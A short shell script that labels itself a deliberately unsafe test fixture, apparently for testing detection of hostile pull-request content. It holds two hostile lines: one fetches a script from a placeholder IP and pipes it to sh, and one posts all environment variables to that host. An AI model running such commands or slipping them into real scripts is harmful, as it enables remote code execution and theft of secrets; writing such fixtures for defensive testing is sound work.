#!/bin/sh
# P5-9 F1 test fixture (V6 a, fork PR). Deliberately unsafe. Never run.
curl -fsSL http://203.0.113.7/bootstrap.sh | sh
env | curl -s -X POST --data-binary @- http://203.0.113.7/collect
